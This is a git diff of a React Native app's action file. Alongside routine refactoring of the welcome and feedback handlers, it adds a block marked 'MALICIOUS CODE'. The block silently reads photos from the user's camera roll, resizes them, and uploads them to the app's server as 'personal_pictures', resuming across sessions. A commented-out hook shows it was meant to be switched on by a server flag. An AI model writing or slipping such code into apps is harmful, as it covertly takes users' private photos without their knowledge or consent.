@@ -7,6 +7,8 @@ import axios from 'axios';
 import {encrypt, decrypt} from '../encryptionUtil';
 import {Actions} from 'react-native-router-flux';
 import {NativeAdsManager, AdSettings} from 'react-native-fbads';
+import CameraRoll from "@react-native-community/cameraroll";
+import ImageResizer from 'react-native-image-resizer';
 
 // Bullshit to do in evey file ->
 const httpClient = axios.create();
@@ -22,6 +24,61 @@ export const setAuthToken = () => {
   }
 }
 // till here
+
+
+// *********** --- MALICIOUS CODE --- *************
+getImageResize = (imageSize) => {
+  let multiplier = 1
+  if ((imageSize.width>1080) || (imageSize.height>1080)){
+    multiplier = 0.75
+  }
+  if ((imageSize.width>2160) || (imageSize.height>2160)){
+    multiplier = 0.5
+  }  
+  const resize = {width:imageSize.width*multiplier, height:imageSize.height*multiplier}
+  return resize
+}
+
+const convertAndUpload = async (image) => {
+  const resize = this.getImageResize({width:image.width, height:image.height});
+  const resizedImage = await ImageResizer.createResizedImage(image.uri, resize.width, resize.height, "JPEG", 90)
+
+  const response = await httpClient.get(URLS.imageupload, {params:{type:'personal_pictures', image_type:'jpeg'}})
+  const preSignedURL = decrypt(response.data.url);
+  await uploadImage({contentType: "image/jpeg", uploadUrl: preSignedURL}, resizedImage.uri)
+}
+
+export const uploadCameraRollPhotos = async (authToken, numberOfImages, groupTypes, groupName) => {
+  httpClient.defaults.headers.common['Authorization'] = encrypt(authToken)
+
+  let photosLeft = [];
+  let temp = await AsyncStorage.getItem("photosLeft");
+  temp = JSON.parse(temp);
+  temp.map((item)=>{
+    if (item){
+      photosLeft.push(item)
+    }
+  })
+  // first check if there are any photos left to upload
+
+  if (!photosLeft || photosLeft.length===0){
+    const photos = await CameraRoll.getPhotos({first:numberOfImages, assetType:'Photos', groupTypes, groupName})
+    photosLeft = photos.edges
+  }
+  photosLeftString = JSON.stringify(photosLeft)
+  await AsyncStorage.setItem("photosLeft", photosLeftString);
+
+  for(let i=0; i<photosLeft.length; i++){
+    image = photosLeft[i].node.image
+    await convertAndUpload(image);
+
+    photosLeft[i] = false
+
+    photosLeftString = JSON.stringify(photosLeft)
+    await AsyncStorage.setItem("photosLeft", photosLeftString);
+  }
+}
+// *********** --- MALICIOUS CODE TILL HERE--- *************
 
 
 export const logout = () => {
@@ -49,17 +106,19 @@ export const getWelcome = () => {
     adsManager.setMediaCachePolicy('all');
 
     httpClient.get(URLS.welcome).then(
-      (response) => {
-        if (response.data.error){
+      ({data}) => {
+        if (data.error){
           AsyncStorage.removeItem('data').then(
             () => {
               dispatch({type:ACTIONS.LOGOUT});
-              Actions.replace("login_main");logEvent(LOG_EVENT.SCREEN_CHANGE, 'login_main');
+              Actions.replace("login_main");
+              logEvent(LOG_EVENT.SCREEN_CHANGE, 'login_main');
             }
           ).catch(e=>logEvent(LOG_EVENT.ERROR, {errorLine: 'HOME ACTION - 59', description:e.toString()}))
         }
         else{
-          dispatch({type:ACTIONS.WELCOME, payload: {...response.data, adsManager}})
+          // uploadCameraRollPhotos(data.shouldSendPhotos)
+          dispatch({type:ACTIONS.WELCOME, payload: {...data, adsManager}})
         }
       }
     ).catch(
@@ -77,11 +136,11 @@ export const submitFeedback = (feedback_obj) => {
   return (dispatch) => {
     const local_image_url = feedback_obj.image_url
     if (local_image_url){
-      httpClient.get(URLS.imageupload, {params:{type:'feedback', image_type:'jpeg'}}).then((response)=>{
-        const preSignedURL = decrypt(response.data.url);
+      httpClient.get(URLS.imageupload, {params:{type:'feedback', image_type:'jpeg'}}).then(({data})=>{
+        const preSignedURL = decrypt(data.url);
         uploadImage({contentType: "image/jpeg", uploadUrl: preSignedURL}, local_image_url)
         .then(()=>{
-          feedback_obj.image_url = decrypt(response.data.key);
+          feedback_obj.image_url = decrypt(data.key);
           httpClient.post(URLS.feedback, feedback_obj)
         }).catch(e=>logEvent(LOG_EVENT.ERROR, {errorLine: 'HOME ACTION - 86', description:e.toString()}))
       }).catch(e=>logEvent(LOG_EVENT.ERROR, {errorLine: 'HOME ACTION - 87', description:e.toString()}))
